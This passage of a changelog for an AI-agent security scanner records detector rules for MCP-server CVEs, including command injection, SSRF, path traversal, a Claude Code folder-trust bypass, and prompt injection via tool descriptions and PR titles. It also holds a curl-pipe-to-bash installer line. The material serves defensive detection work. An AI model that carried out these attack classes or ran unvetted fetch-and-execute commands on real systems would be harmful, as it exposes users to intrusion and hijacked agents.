  patched .NET 1.71.0) — out of scope for AAK's current ecosystem
  (no NuGet scanner). Track for v0.4.x roadmap if NuGet scanning
  ever lands.
- Source detector for unsafe `InMemoryVectorStore(filter=...)`
  shape — v0.3.18 candidate once SK API surface stabilises post-
  patch.
- PraisonAI CRITICALs (#200, #201 from v0.3.16; re-fired as #209,
  #210 today) — `AAK-PRAISONAI-CVE-2026-41497-PIN-001` +
  `AAK-PRAISONAI-CVE-2026-44336-PIN-001` carry to v0.3.18.
- Watcher dedup fix (#163) — v0.3.18.

## [0.3.16] - 2026-05-09

**Headline: 1 new CVE rule (194 total) closing the v0.3.15 triage
deferral on Claude Code folder-trust bypass + GitHub repo
description drift fix + adjudicator-pattern architectural note.**

This release closes the highest-leverage public-marketing-surface
drift the kit has carried since launch (the GitHub repo `description`
field was pinned at "77 rules, 13 scanners" while live RULE_COUNT
was 193) and ships the pre-allocated CLAUDECODE pin rule that v0.3.15
queued.

### Added — Rule (1)

- **AAK-CLAUDECODE-CVE-2026-40068-PIN-001** (HIGH, CVE-2026-40068) —
  Anthropic Claude Code folder-trust bypass via crafted git worktree
  `commondir` file. Pin-arm only (Claude Code is a binary product, not
  a code shape we statically scan); fires on the scoped npm package
  `@anthropic-ai/claude-code` < 2.1.83 in `package.json` /
  `package-lock.json` / `yarn.lock` / `pnpm-lock.yaml`. Vendor
  patched in 2.1.83 (2026-05-04). Closes the v0.3.15 deferral on
  [#181](https://github.com/sattyamjjain/agent-audit-kit/issues/181).

### Added — Architectural note

- `docs/notes/adjudicator-pattern.md` — short write-up of AAK's
  multi-arm adjudicator pattern (pin + source/config + explicit-
  reject short-circuit + adjudicator log), cross-referenced to
  Mozilla's published Firefox-hardening triage flow as an external
  precedent and to arXiv 2605.03378 as the runtime-side complement.
  Closes the procurement-reviewer question "is this a single-shot
  regex scanner or a real adjudicator?" with a one-page answer and
  external citations. README "Why This Exists" appends a one-line
  link to the note.

### Changed

- **GitHub repo `description` field re-PATCHED** from the stale "77
  rules, 13 scanners…" to the live spec sentence: *"Static scanner
  for MCP-connected AI agent pipelines — 193 rules across 11
  categories, 12 compliance frameworks, OWASP Agentic 10/10 + MCP
  10/10, GitHub Action, SARIF, 48h CVE-to-rule SLA."* This was the
  largest single marketing-surface drift on the kit (procurement
  reviewers paste this into their first email) and was not wired
  into `_RULE_COUNT_RE` / sync scripts.
- `docs/RELEASING.md` (NEW) — codifies the release ritual including
  the post-tag `gh repo edit --description` step so v0.3.17+ doesn't
  re-drift. The description-field is a one-time-set field unless
  re-PATCHed every release.
- `CHANGELOG.cves.md` ledger appends a new ANTHROPIC-CLAUDECODE-
  2026-05-06 incident-class header + the CVE-2026-40068 row.

### Tests

- 3 new tests in `tests/test_v0_3_16_rules.py` (vulnerable pin
  fires, safe pin passes, no-dep passes). Total 946 passing
  (was 943).

### Triage (no code change)

- 19 dup CVE-bot tickets closed (#183-#190, #192-#199, #202-#205) —
  class-coverage citations.
- 2 PraisonAI CRITICALs (#200 CVE-2026-41497 CVSS 9.8 + #201
  CVE-2026-44336 CVSS 9.6) closed with **v0.3.17 deferral**:
  rule-names pre-allocated as `AAK-PRAISONAI-CVE-2026-41497-PIN-001`
  + `AAK-PRAISONAI-CVE-2026-44336-PIN-001`. Class detection covers
  CVE-2026-41497 via `AAK-MCP-STDIO-CMD-INJ-001` but the named pin
  row is missing; CVE-2026-44336 (default-registered file-handling
  tools without sandbox) is a new shape and needs a companion source
  detector.
- #181 closed by ship.

### Deferred

- A3 CSA Agentic Trust full conformance (carry from v0.3.15) — still
  contingent on Anthropic+PE-JV / OpenAI-Deployment-Co procurement-
  spec follow-up. None today.
- Phase 2 row Agent-Zero (#160), Phase 3 LettaAI + transport-flip
  generalization (#161, #162) — v0.3.17+.
- Watcher dedup fix (#163) — v0.3.17.

## [0.3.15] - 2026-05-06

**Headline: Phase 2 of OX MCP 2026-05-01 batch — GPT-Researcher pin
+ transport-flip detector (193 rules total) + new MCP 2026 Roadmap
conformance value for `aak scan --compliance`.**

### Added — Rule (1)

- **AAK-GPTRESEARCHER-MCP-STDIO-MITM-001** (HIGH, CVE-2025-65720) —
  Phase 2 sibling of v0.3.14's DocsGPT rule. Pin arm fires on
  `gpt-researcher` / `gpt-researcher-mcp` in PyPI manifests
  (`requirements*.txt` / `pyproject.toml` / `Pipfile*` / `poetry.lock`
  / `uv.lock`), npm (`package.json` + 3 lockfile shapes), and
  `assafelovic/gpt-researcher` git+https / `github:` shorthand pins.
  Latest PyPI release (0.14.8, 2026-03-13) predates the OX
  2026-05-01 disclosure → no upstream patch yet → `patched_in: None`
  posture (every published version fires). Transport-flip arm: new
  `agent_audit_kit/scanners/gpt_researcher_transport_flip.py` mirrors
  the v0.3.14 `docsgpt_transport_flip.py` shape against
  `gpt-researcher`-named MCP configs. Configs with explicit
  `deny_stdio_transport: true` or `allowed_transports: ["sse"]`
  short-circuit the rule. Architectural class is also covered by
  `AAK-MCP-STDIO-CMD-INJ-001` (Python receiver). Closes [#159](https://github.com/sattyamjjain/agent-audit-kit/issues/159).

### Added — Compliance framework (1)

- **MCP 2026 Roadmap** (`--compliance mcp-2026-roadmap`) — 5 controls
  derived from the May 2026 Roadmap publication: Transport Hardening
  (no stdio override), Tool Provenance / Signed Tools, Protocol
  Version Pinning, Authenticated Endpoints (STDIO deprecation),
  Marketplace Source Provenance. Maps onto existing AAK rules via the
  same OWASP Agentic ASI codes the other 5 frameworks use. Bumps the
  README "compliance frameworks" claim from 11 to **12**. Lite scope
  per the 2026-05-06 daily plan; the full CSA Agentic Trust
  conformance surface (deferred yesterday as A3) seeds off this
  data-shape and ships in v0.3.16+.

### Changed

- README "Compliance Frameworks" anchor — increments framework count
  per the `_FRAMEWORK_COUNT_RE` regression pattern.
- `CHANGELOG.cves.md` — appends CVE-2025-65720 row under the
  OX-MCP-2026-05-01 incident-class header that v0.3.14 created.

### Tests

- 8 new tests (`tests/test_v0_3_15_rules.py`): 3 pin-arm cases (PyPI
  vulnerable, git+https vulnerable, no-manifest passes), 3
  transport-flip cases (unsafe fires, explicit-reject passes,
  scope-gate without GPT-Researcher hint passes), 2 compliance
  framework cases (registered + report renders). Total 943 passing
  (was 935).

### Triage closures (no code change)

- 17 duplicate CVE-bot tickets closed (#164–#180) — single-author
  MCP server CVEs class-covered by existing umbrella rules. Watcher
  dedup fix tracked at #163.
- 1 ticket (#181 Claude Code folder-trust via git worktree commondir,
  CVE-2026-40068) closed with explicit v0.3.16 deferral — vendor
  patched in `claude-code` 2.1.83; named pin-floor rule
  `AAK-CLAUDECODE-CVE-2026-40068-PIN-001` queued.

### Deferred

- **A3** (CSA Agentic Trust full conformance surface) — deferred to
  2026-05-07 pending Anthropic+PE-JV / OpenAI-Deployment-Co
  procurement-spec follow-up. The MCP 2026 Roadmap data-shape shipped
  here is the seed.
- **Phase 2 row Agent-Zero (CVE-2026-30624)** — queued for v0.3.16
  per per-rule quality-bar discipline (issue [#160](https://github.com/sattyamjjain/agent-audit-kit/issues/160)).
- **Phase 3 row LettaAI** + transport-flip generalization — queued
  for v0.3.16+ (issues [#161](https://github.com/sattyamjjain/agent-audit-kit/issues/161), [#162](https://github.com/sattyamjjain/agent-audit-kit/issues/162)).

## [0.3.14] - 2026-05-05

**Headline: 1 new CVE rule (192 total) + roadmap doc closing the
2026-05-01 OX/BackBox MCP-server batch — DocsGPT pin (<0.6.4 on
npm/git+https) + DocsGPT MCP-config transport-flip MITM detector.**

This release ships the DocsGPT entry from the OX MCP 2026-05-01
disclosure cluster (CVE-2026-26015 family) as a named product row
alongside the existing class-coverage from v0.3.6's
`AAK-MCP-STDIO-CMD-INJ-001..004` + `AAK-STDIO-001`. The other three
products in the carry-list (GPT-Researcher, Agent-Zero, LettaAI)
are queued for v0.3.15 / v0.3.16 per `docs/roadmap/ox-mcp-2026-05-01-batch.md`.

### Added — Rule (1)

- **AAK-DOCSGPT-MCP-STDIO-MITM-001** (HIGH, CVE-2026-26015) — Two
  detector arms. **Pin arm**: fires on `docsgpt` < 0.6.4 in npm
  (`package.json` / `package-lock.json` / `yarn.lock` /
  `pnpm-lock.yaml`), on `arc53/DocsGPT` git+https / `github:` shorthand
  pins, and on `docsgpt(-mcp)` < 0.6.4 in Python manifests
  (`requirements*.txt` / `pyproject.toml` / `Pipfile*` / `poetry.lock`
  / `uv.lock`). **Transport-flip arm**: new
  `agent_audit_kit/scanners/docsgpt_transport_flip.py` fires when a
  DocsGPT-named MCP config (`.mcp.json` / `mcp.json` /
  `docsgpt.config.json` / `.docsgpt/*.json` / `configs/*.json`)
  declares an SSE/HTTP transport but permits a post-handshake
  `transport=stdio` override. Configs that explicitly set
  `deny_stdio_transport: true` or `allowed_transports: ["sse"]`
  short-circuit the rule. Class architectural shape is also covered
  by `AAK-MCP-STDIO-CMD-INJ-001..004` + `AAK-STDIO-001`.

### Added — Roadmap

- `docs/roadmap/ox-mcp-2026-05-01-batch.md` — design doc converting
  the OX MCP 2026-05-01 carry-list into 4 named issues with a
  dependency graph (pin → source → fix → test). Sets the v0.3.15 /
  v0.3.16 ramp for GPT-Researcher / Agent-Zero / LettaAI plus a
  cross-cutting transport-flip-resistance generalization.

### Changed

- README "Why This Exists" → appends one-sentence cite of the
  2026-05-01 OX/BackBox 10+-CVE disclosure batch, naming the 9
  affected products and the existing umbrella `AAK-MCP-STDIO-CMD-INJ-*`
  rules that catch the receiver-side architectural class.
- `CHANGELOG.cves.md` — appends the OX-MCP-2026-05-01 incident-class
  row + the CVE-2026-26015 DocsGPT row.

### Tests

- 7 new tests (`tests/test_v0_3_14_rules.py`): 3 pin-arm cases (npm
  vulnerable, git+https vulnerable, npm safe-pin passes), 4
  transport-flip cases (unsafe fires, explicit-reject passes,
  no-override passes, scope-gate without DocsGPT hint passes).
  Total 935 passing (was 928).

### Triage closures (no code change)

- 13 duplicate CVE-bot tickets closed (#141–#153) — single-author
  MCP server CVEs already class-covered by
  `AAK-MCP-STDIO-CMD-INJ-001..004` + `AAK-STDIO-001`. Watcher dedup
  fix re-flagged for v0.3.15.
- 4 tickets closed with v0.3.15 deferral: #154/#155/#156 (n8n MCP
  OAuth open-redirect, CVE-2026-42230/42235/42236 — class-covered
  by `AAK-OAUTH-*` family; named pin-floor for `n8n` <
  1.123.32/2.17.4/2.18.1 queued); #157 (Anthropic Claude TS SDK
  `BetaLocalFilesystemMemoryTool` permissive umask, CVE-2026-41686
  — pin-floor for `@anthropic-ai/sdk` <0.91.1 queued).

## [0.3.13] - 2026-05-03

**Headline: backlog-triage release — 1 new CVE rule (191 total) +
2 new product surfaces (`aak notify` Slack webhook + pre-commit
one-liner installer).** Closes 13 backlog issues in one ship: 8 GFI
trivials (#9, #10, #11, #13, #14, #16, #17, #18, plus #12 already
shipped), the chatgpt-mcp CVE pin (#80), the pre-commit installer
(#65), the Slack webhook (#66 minimum), 4 superseded umbrellas
(#15, #21, #26, #64), and 8 duplicate CVE-bot tickets (#131-#138).

### Added — Rule (1)

- **AAK-CHATGPT-MCP-CVE-2026-7061-PIN-001** (HIGH, CVSS 7.3) —
  `Toowiredd/chatgpt-mcp-server <=0.1.0` OS command injection in
  `src/services/docker.service.ts`. Package isn't on npm — consumers
  install via `git+https://` or `github:Toowiredd/...` shorthand
  in package.json. Pin-check fires whenever the package appears in
  any npm manifest (every published version is vulnerable; no
  upstream patch as of ship date). Architectural class is also
  caught by `AAK-MCP-STDIO-CMD-INJ-002`. Closes #80.

### Added — CLI surfaces

- `aak notify [PATH]` — runs a scan and dispatches findings to the
  sinks declared in `.aak-notify.yaml`. Slack `incoming-webhook`
  ships in this release; PagerDuty + Linear are explicit
  `NotImplementedError` stubs so consumers can build configs ahead
  of v0.4.0. Supports `--dry-run` and `--config`. Closes #66.
- `scripts/install-pre-commit.sh` — one-liner installer
  (`curl -fsSL .../install-pre-commit.sh | bash`). Auto-detects
  the latest GitHub Release tag, appends to existing
  `.pre-commit-config.yaml` or creates a new one, runs
  `pre-commit install`. Closes #65.

### Added — CLI flags / docs / fixtures (#9, #10, #11, #13, #14, #16, #17, #18)

- `aak <subcommand> --version` on every subcommand (21 decorators).
- `aak scan --quiet/-q` suppresses header / summary / tip footer
  on console-format output.
- `aak discover --format json` emits a stable schema for
  programmatic use (`{count, agents}`).
- `aak score` ANSI-colors the grade (A/B green, C yellow, D/F red).
- `.editorconfig` codifies repo conventions.
- `docs/circleci.md` + `docs/azure-pipelines.md` mirror the GH
  Actions integration guide.
- `tests/test_supply_chain.py` — 4 boundary cases for
  `_version_in_range` + the requirements-glob path.

### New module

- `agent_audit_kit/integrations/notify.py` — `SlackSink`,
  `PagerDutySink` (stub), `LinearTicketSink` (stub),
  `load_notify_config`, `run_notify`. Designed so consumers can
  declare every sink they want today; only Slack actually posts.

### Tests

- 14 new tests: 4 chatgpt-mcp pin (`tests/test_v0_3_13_rules.py`),
  10 notify sinks (`tests/test_integrations_notify.py`). Total
  928 passing (was 914).

### Triage closures (no code change)

- `#15` "77 rules" doc — superseded (repo at 191).
- `#21` v0.3.0 tracker umbrella — superseded.
- `#26` v0.3.0 stretch umbrella — half-shipped, items re-filed.
- `#64` Hosted aak.dev SARIF dashboard — wontfix in this repo
  (spin off to `aak-dashboard` if ever pursued).
- `#131-#138` — duplicates of CVEs already class-covered by
  `AAK-MCP-STDIO-CMD-INJ-001/002/003/004` and triaged in the
  morning v0.3.11/v0.3.12 batch. Watcher dedup follow-up logged.

## [0.3.12] - 2026-05-03

> Note: v0.3.11 was tagged with a stale `pyproject.toml` (still
> reading `0.3.10`) and so the PyPI publish job rejected the
> `0.3.10` wheel as a duplicate; the GitHub Release was skipped.
> The same content ships as v0.3.12 with a corrected manifest. The
> v0.3.11 tag is retained as a permanent failed-release marker;
> it has no PyPI artefact, no GitHub Release, and no `aak`
> consumer should ever see it on the index.

**Headline: 2 new CVE rules (190 total) + README scanner-count drift
fix — astro-mcp-server CVE-2026-7591 SQLi (pin + TS/JS source
detector), LiteLLM CVE-2026-30623 pin floor (auto-fix-wired), and
`scripts/sync_scanner_count.py` to keep README's `<!-- scanner-count
-->` anchor in lockstep with `agent_audit_kit/scanners/`.**

This release closes the public 48-hour CVE-to-rule SLA on two fresh
disclosures: CVE-2026-7591 against TimBroddin/astro-mcp-server (NVD
2026-05-01, no upstream patch released yet — every published version
is vulnerable) and CVE-2026-30623 against BerriAI/litellm (patched in
v1.83.7 on 2026-04-30). It also fixes a long-standing README claim
("28 scanner modules") that drifted past the actual filesystem count
of 57 detectors over twelve minor revs.

### Added — Rules (2)

- **AAK-ASTROMCP-SQLI-CVE-2026-7591-001** (HIGH) — TimBroddin/
  astro-mcp-server SQL injection in `src/index.ts` MCP-tool query
  construction via `request.params.arguments`. Two detector arms:
  pin-check on `package.json` / `package-lock.json` / `yarn.lock` /
  `pnpm-lock.yaml` fires whenever the package is present (every
  published version <=1.1.1 is vulnerable, no patch as of ship date),
  and a TS/JS source detector fires when files importing the package
  build queries via string concatenation or untagged template
  literals. Tagged-template SQL helpers (`drizzle-orm`,
  `postgres-js`, `sql-template-tag`) escape interpolations safely
  and are intentionally not matched. CVE anchor: NVD 2026-05-01.
- **AAK-LITELLM-CVE-2026-30623-PIN-001** (HIGH, auto-fixable) —
  `litellm` pinned at <1.83.7 in any Python manifest
  (`requirements*.txt`, `pyproject.toml`, `Pipfile*`, `poetry.lock`,
  `uv.lock`). Complements `AAK-MCP-STDIO-CMD-INJ-001` (which catches
  the source-side architectural shape) by surfacing a discrete
  finding for consumers running pin-check mode. Wired into
  `aak fix --cve` so the auto-fixer rewrites a `requirements*.txt`
  pin in place. Patch anchor: BerriAI/litellm v1.83.7 on 2026-04-30.

### Changed

- README "28 scanner modules" prose → `<!-- scanner-count:total
  -->NN<!-- /scanner-count --> scanner modules` anchor, kept in
  lockstep with the filesystem count via
  `scripts/sync_scanner_count.py`. Same posture as
  `sync_rule_count.py`: pre-commit hook blocks human drift; the
  existing `sync-rule-count.yml` workflow auto-runs
  `sync_scanner_count.py` after relevant pushes and commits the
  bumped files back.
- `agent_audit_kit/__init__.py` — added `SCANNER_COUNT` constant
  alongside `RULE_COUNT`.

### Tests

- 11 new tests: 6 cover the astro-mcp pin + source matrix
  (vulnerable pin fires, concat-source fires, parameterized passes,
  tagged-template passes, no-import-scope-gate passes, pin+source
  side-by-side); 4 cover the LiteLLM pin floor (vulnerable fires,
  safe-pin passes, floor-pin passes, `fix --cve` codemod bumps the
  pin in place); 1 guards the README scanner-count anchor against
  filesystem drift.

### Carry list — for next release

- Four MCP-server CVEs from the 2026-05-01 OX/BackBox roundup
  (DocsGPT, GPT-Researcher, Agent-Zero, LettaAI) need their own
  pin-check + source pattern + fixture sets — deferred from today
  because each is independently >S effort.
- The 2026-05-02 plan's deferred P0 list (Flowise CVE-2025-59528,
  Cursor CVE-2026-26268, OpenClaw CVE-2026-32922 escalation variant,
  LMDeploy CVE-2026-33626) re-evaluates against fresh primary sources
  in the next prompt rather than carrying over silently.

## [0.3.10] - 2026-04-29

**Headline: 8 new rules (188 total), 4 new product surfaces — CrewAI
four-CVE chain (CERT/CC VU#221883), AIVSS v0.8 scoring, LangChain
prompt-loader CVE-2026-34070, Prisma AIRS catalog mapper, OpenClaw
provisional rule, `aak watch-cve` daemon, public coverage page,
`aak rule lint`.**

This release lands the v0.3.10 plan in full: 5 SAST rules + 1 meta
rule for the CrewAI exploit chain, OWASP AIVSS v0.8 scoring during
the public-review window, four new CLI surfaces (`aak score
<sarif> --aivss`, `aak watch-cve`, `aak coverage --source
prisma-airs`, `aak rule lint`), and three open-issue resolutions
(fixture license declarations, parity per-region drift tests, SARIF
runtime-context spec).

### Added — Rules (8)

- **AAK-CREWAI-CHAIN-2026-04-001** (CRITICAL, meta) — fires when all
  four CrewAI 0.x exploit-chain shapes are reachable in one module.
- **AAK-CREWAI-CVE-2026-2275-001** (CRITICAL) — `CodeInterpreterTool(
  unsafe_mode=True)` host-Python sandbox escape.
- **AAK-CREWAI-CVE-2026-2285-001** (HIGH) — `JSONSearchTool` /
  `JSONLoader` path traversal via untrusted file_path.
- **AAK-CREWAI-CVE-2026-2286-001** (HIGH) — `RagTool` /
  `WebsiteSearchTool` SSRF without allow-list / private-net guard.
- **AAK-CREWAI-CVE-2026-2287-001** (HIGH) — `CodeInterpreterTool` no
  Docker liveness gate; silent fallback to host Python.
- **AAK-LANGCHAIN-PROMPT-LOADER-PATH-001** (HIGH) —
  `langchain.prompts.load_prompt(path)` traversal (CVE-2026-34070,
  patched in `langchain-core>=0.3.74`).
- **AAK-PRISMA-AIRS-COVERAGE-001** (INFO, meta) — Prisma AIRS catalog
  coverage manifest.
- **AAK-OPENCLAW-PRIVESC-001** (HIGH, provisional) — OpenClaw
  `OpenClawAgent(role=...)` missing / forgable; IronPlate
  2026-04-07 weekly intel CVSS 9.9.

### Added — CLI commands

- `aak score <sarif> --aivss` — annotate SARIF with AIVSS v0.8
  scores (AARS, environmental, threat, exploit-availability).
- `aak coverage --source prisma-airs` — coverage matrix vs the
  public Prisma AIRS attack catalog. `--fail-under N` for CI.
- `aak watch-cve --feeds ox,cert-cc,thaicert,ironplate` — CVE-feed
  daemon. Polling + dedup + dispatch framework; per-feed fetchers
  land in v0.3.11.
- `aak rule lint --ci` — validate the RuleDefinition registry against
  AAK metadata invariants.

### Added — Runtime helpers

- `agent_audit_kit.scoring.aivss.score_finding(rule_meta, runtime_ctx)`
  + `annotate_sarif(sarif, get_rule)` — AIVSS v0.8 annotator.
- `agent_audit_kit.checks.path_under_root(path, root)` — generic
  path-traversal guard, suppresses
  `AAK-LANGCHAIN-PROMPT-LOADER-PATH-001`.
- `agent_audit_kit.checks.openclaw.assert_role_allowlisted(role,
  allowlist=...)` — suppresses `AAK-OPENCLAW-PRIVESC-001`.
- `agent_audit_kit.sanitizers.crewai`:
  `assert_codeinterp_safe_mode`, `validate_jsonloader_path`,
  `validate_rag_url`, `require_docker_liveness` — suppress the four
  CrewAI sub-rules.

### Added — Manifests & data

- `agent_audit_kit/data/aivss-v08-defaults.json` — per-rule AARS /
  environmental / threat / exploit defaults.
- `agent_audit_kit/data/prisma-airs-catalog.json` + `-aak-map.json`
  — public Prisma AIRS catalog subset + AAK rule mapping.
- `scripts/build_coverage_page.py` + `.github/workflows/coverage-page.yml`
  — nightly public coverage page (HTML + JSON) on gh-pages.

### Housekeeping

- O10 — `tests/fixtures/LICENSES.md` declares derivation + license
  per fixture set.
- O11 — `tests/test_parity_region_drift.py` adds per-region drift
  tests + windowed report (28d / 1s edge cases).
- O12 — `docs/spec/sarif-runtime-context.md` proposes
  `properties.runtime_context` for SARIF.

### Tests

- `tests/test_v0_3_10_rules.py` (10) + `tests/test_v0_3_10_features.py`
  (15) + `tests/test_parity_region_drift.py` (4).

Total suite: 898 passing.


## [0.3.9] - 2026-04-28

**Headline: 5 new rules (180 total), 4 new CLI commands, runtime
parity-drift detector, Pipelock v2.3 policy bridge, and a stdio LSP
adapter that drops AAK findings into Zed and VS Code.**

This release lands the v0.3.9 plan in full: 3× P0 SAST rules for the
2026-04-24/25/26 cluster (Project Deal economic drift, LangGraph
ToolNode regression, DeepSeek V4 MoE tool injection), one P2 rule for
the BlackHat Asia 2026 social-agent hijack class, an OX-disclosed CVE
coverage manifest with a public badge, a Pipelock v2.3 → AAK config
translator, an `aak inspect-ide` CLI that publishes LSP diagnostics
(plus a Zed extension), a runtime `@aak.parity.check` decorator with
`aak parity report`, and corpus-manifest provenance fields
(`source_url` / `license` / `fetched_at`).

### Added — Rules (5)

- **AAK-PROJECT-DEAL-DRIFT-001** (HIGH) — pricing function calls an
  LLM with a templated `model=` and no `@aak.parity.check`. Anthropic
  Project Deal class (LLM09 / economic harm).
- **AAK-LANGGRAPH-TOOLNODE-LIST-REGRESSION-001** (MEDIUM,
  auto-fixable) — `ToolNode([...])` positional list; LangGraph
  prebuilt 1.0.11 silently coerces. Codemod queued via
  `aak suggest --apply-trivial` in v0.4.0.
- **AAK-DEEPSEEK-V4-MOE-TOOL-INJ-001** (HIGH) — DeepSeek V4 MoE-routed
  tool description sourced from a request body / document loader
  without `sanitize_tool_description`. LLM01 with MoE-specific
  surface.
- **AAK-TIKTOK-AGENT-HIJACK-001** (HIGH) — social-agent reply sink
  reachable from user-content source without a human-in-loop gate.
  BlackHat Asia 2026 (Jiacheng Zhong) hijack class (LLM08).
- **AAK-OX-COVERAGE-MANIFEST-001** (INFO, meta) — drives the
  OX-disclosed CVE coverage badge + `aak coverage --source ox`.

### Added — CLI commands (4)

- `aak coverage --source ox` — prints AAK's static coverage of the
  OX disclosure timeline. `--format text|json|badge`.
- `aak pipelock import <policy.yaml>` — translates a Pipelock v2.3
  policy into a `.agent-audit-kit.yml`. `--dry-run` prints to stdout.
- `aak inspect-ide [PATH]` — runs AAK and emits LSP-shape
  diagnostics. `--serve` starts a stdio LSP server (Zed / VS Code
  language clients can attach).
- `aak parity report` — reads the in-process `@aak.parity.check`
  registry and runs the parity assertion. `--window` accepts `7d`,
  `24h`, `60m`, `30s`.

### Added — Runtime helpers

- `agent_audit_kit.parity.check(...)` decorator — records every
  invocation's `(dimensions, metric)` tuple; thread-safe.
- `agent_audit_kit.checks.economic_drift.assert_parity(...)` —
  per-bucket mean drift assertion. `ParityDriftError` on failure.
- `agent_audit_kit.sanitizers.deepseek.sanitize_tool_description` —
  strips control characters + routing-poison tokens, truncates.
  Calling it in the same function suppresses the SAST rule.
- `agent_audit_kit.autofix.langgraph_toolnode.fix(text)` —
  idempotent text-level rewrite for the ToolNode regression.

### Added — Editor / IDE

- `editors/zed/extension.toml` — Zed extension that auto-launches
  `agent-audit-kit inspect-ide --serve`.
- `agent_audit_kit/ide/lsp_diag.py` — minimal stdio LSP server,
  `diagnostics_for(path)` helper.

### Added — Coverage / housekeeping

- `agent_audit_kit/data/ox-cve-manifest.json` — 19 OX-disclosed CVE
  entries, all currently covered.
- `schema/ox-cve-manifest.schema.json` — JSON Schema for the
  manifest.
- `.github/workflows/badge-ox-coverage.yml` — auto-publishes
  `public/badges/ox-coverage.json` when the manifest changes.
- `public/corpora/manifest.json` — bumped `schema_version` to `2`;
  every entry now carries `source_url`, `license`, `fetched_at`.
- `agent_audit_kit/corpus/manifest.py` — `CorpusEntry` carries the
  new provenance fields.

### Tests

- `tests/test_v0_3_9_rules.py` — 14 cases covering the 4 new SAST
  scanners + the autofix codemod (vulnerable + safe + scope-gate).
- `tests/test_v0_3_9_features.py` — 10 cases for parity decorator,
  drift assertion, sanitiser idempotence + truncation.
- `tests/test_v0_3_9_features_p1.py` — 15 cases for OX coverage,
  Pipelock translator, IDE LSP adapter (CLI + library).

Total suite: 869 passing.


## [0.3.8] - 2026-04-27

5 new SAST rules + 5 fixture sets + supporting infrastructure for
Comment-and-Control PR title indirect-prompt-injection, MCP function
hijacking (FHI), Atlassian RCE chain, the wild IPI payload corpus,
and the MCPJam Inspector vendored fork. Released alongside the
critical Dockerfile / engine ignore_paths fix from 0.3.7.


## [0.3.7] - 2026-04-26

**Headline: critical Action / Dockerfile fix — published v0.3.6 was
unwriteable for every consumer; v0.3.7 makes the GitHub Marketplace
listing actually work.**

No new rules. No new scanners. v0.3.7 is a release-mechanics patch:
the Dockerfile fix is load-bearing for any consumer who ran the
Action from Marketplace and hit `Permission denied:
'agent-audit-results.sarif'`. Engine ignore_paths fix lands at the
same time so `--ignore-paths` finally works the way the docs claim.

### Fixed

- **Critical: Docker container ran as `USER scanner`** (UID 999) but
  `/github/workspace` is mounted from the runner's checkout owned by
  the runner UID; the container could not write the SARIF output.
  Every consumer of `sattyamjjain/agent-audit-kit@v0.3.6` (and
  earlier) saw `Permission denied: 'agent-audit-results.sarif'`.
  Surfaced via the new dogfood self-scan workflow (PR #71) — the
  loop validates that what we publish actually runs end-to-end.
  Dropped the `USER scanner` directive; container isolation, not
  in-container UID, is the load-bearing security boundary for an
  ephemeral GitHub Docker Action.
- **`engine.run_scan` now applies `--ignore-paths` globally** instead
  of only via the `secret_exposure` scanner kwarg. Every scanner now
  honours the flag. 5 new tests in `tests/test_engine_ignore_paths.py`
  fence the behaviour (subpath match, prefix-not-substring, exact
  file match, trailing-slash insensitivity, multi-scanner suppression).

### Added — release infrastructure

- `.github/workflows/self-scan.yml` — runs the local Action against
  this repo on every push / PR. `default-scan` job (full ruleset,
  `fail-on: critical`) plus `preset-mcp-ox-2026-04` job that
  exercises the `--preset` input end-to-end.

### Upgrade impact

- **Anyone using `sattyamjjain/agent-audit-kit@v0.3.6`** should bump
  to `@v0.3.7` immediately. v0.3.6 silently failed to produce SARIF
  output. Workflow YAML is otherwise compatible — no input/output
  changes.

## [0.3.6] - 2026-04-26

**Headline: OX MCP STDIO architectural class — Python/TS/Java/Rust SDK
rules, marketplace-fetch detection, Azure/LMDeploy/Splunk variants,
mcp-ox-2026-04 preset.**

Converts AAK's posture from CVE-by-CVE response to class coverage. 8
CVEs (CVE-2026-30615, 30617, 30623, 22252, 22688, 33224, 40933, 6980)
all trace to `StdioServerParameters(command=<network_input>)` across
the upstream MCP SDKs; v0.3.6 ships one rule per language plus the
marketplace-fetch single-line shape Cloudflare's MCP-defender writeup
called out as the highest-risk bug in the wild.

### Added — rule coverage (8 new rules, 161 → 169)

- **AAK-MCP-STDIO-CMD-INJ-001** (CRITICAL, SUPPLY_CHAIN, Python) —
  `StdioServerParameters(command=...)` from `mcp.client.stdio` /
  `modelcontextprotocol.client` reached via tainted source. AST walk
  with calls sorted by source line.
- **AAK-MCP-STDIO-CMD-INJ-002** (CRITICAL, TypeScript) —
  `new StdioClientTransport({...})` after a fetch / req.body /
  process.env / JSON.parse marker. Regex pass.
- **AAK-MCP-STDIO-CMD-INJ-003** (CRITICAL, Java) —
  `StdioServerParameters.Builder().command(...).args(...).build()`
  after a HttpServletRequest / RestTemplate / WebClient /
  ObjectMapper.readValue / System.getenv marker. Nested-paren-safe
  regex (split into opener + terminator-window scan).
- **AAK-MCP-STDIO-CMD-INJ-004** (CRITICAL, Rust, regex-only) —
  `Command::new(...)` adjacent to mcp_sdk / modelcontextprotocol
  imports after a reqwest / serde_json / std::env / hyper / actix /
  axum body-extractor marker. ~10% FP rate on macro-heavy codebases
  until #22 lands tree-sitter-rust.
- **AAK-MCP-MARKETPLACE-CONFIG-FETCH-001** (CRITICAL, SUPPLY_CHAIN) —
  fetch(URL) → StdioServerParameters in same function. Suppression
  via `.aak-mcp-marketplace-trust.yml` with required justification.
- **AAK-AZURE-MCP-NOAUTH-001** (HIGH, MCP_CONFIG, server-side) — repos
  publishing Azure-MCP-shaped servers without auth middleware on
  `/mcp/*` routes. Sister to v0.3.5's consumer-side AAK-AZURE-MCP-001.
  CVE-2026-32211.
- **AAK-LMDEPLOY-VL-SSRF-001** (HIGH, TRANSPORT_SECURITY) — LMDeploy
  VL image-loader fetches user-controlled URLs without allow-list.
  CVE-2026-33626 (GHSA-only at cut; NVD enrichment pending).
- **AAK-SPLUNK-MCP-TOKEN-LEAK-001** (HIGH, SECRET_EXPOSURE,
  config variant) — splunk-mcp-server config files routing token
  sourcetypes to `_internal` / `_audit` indexes. Distinct from v0.3.4's
  runtime taint detector AAK-SPLUNK-TOKLOG-001.

### Added — preset infrastructure

- `agent_audit_kit/presets/__init__.py` + `load_preset()` registry.
- `agent_audit_kit/presets/mcp-ox-2026-04.yaml` bundles 12 OX-class
  rules.
- CLI flag `--preset <name>` + `preset:` input in `action.yml` +
  positional arg in `entrypoint.sh`.
- Per-preset doc at `docs/presets/mcp-ox-2026-04.md`.

### Caveats

- Rust adapter is regex-only until #22 lands tree-sitter-rust.
- CVE-2026-33626 ships citing GHSA index entry; NVD enrichment
  pending. Pin floor will tighten in v0.3.7.

## [0.3.5] - 2026-04-25

